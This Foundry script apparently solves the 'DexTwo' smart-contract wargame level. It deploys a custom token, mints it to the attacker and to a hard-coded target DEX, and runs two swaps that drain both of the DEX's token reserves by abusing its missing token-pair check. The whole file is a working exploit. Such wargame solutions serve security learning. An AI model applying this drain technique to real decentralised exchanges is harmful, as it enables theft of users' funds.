// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TokenC} from "../src/23-DexTwo/TokenC.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract DeployAttack is Script {
    address private constant TARGET_ADDRESS = 0x1da438e60a6CFefd4544e7BA722465e470cF6556;
    uint256 private constant INITIAL_ATTACKER_BALANCE = 10;
    uint256 private constant INITIAL_DEX_BALANCE = 100;
    IDexTwo target;
    address token1;
    address token2;
    TokenC tokenC;


    function run() public {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        target = IDexTwo(TARGET_ADDRESS);       
        token1 = target.token1();
        token2 = target.token2();
        
        vm.startBroadcast(pk);
        tokenC = new TokenC();

        tokenC.mint(vm.addr(pk), 2);

        tokenC.mint(TARGET_ADDRESS, 1);
        IERC20(address(tokenC)).approve(TARGET_ADDRESS, 1);
        target.swap(address(tokenC), token1, 1);

        tokenC.burn(TARGET_ADDRESS, 1);
        IERC20(address(tokenC)).approve(TARGET_ADDRESS, 1);
        target.swap(address(tokenC), token2, 1);

        vm.stopBroadcast();
    }

}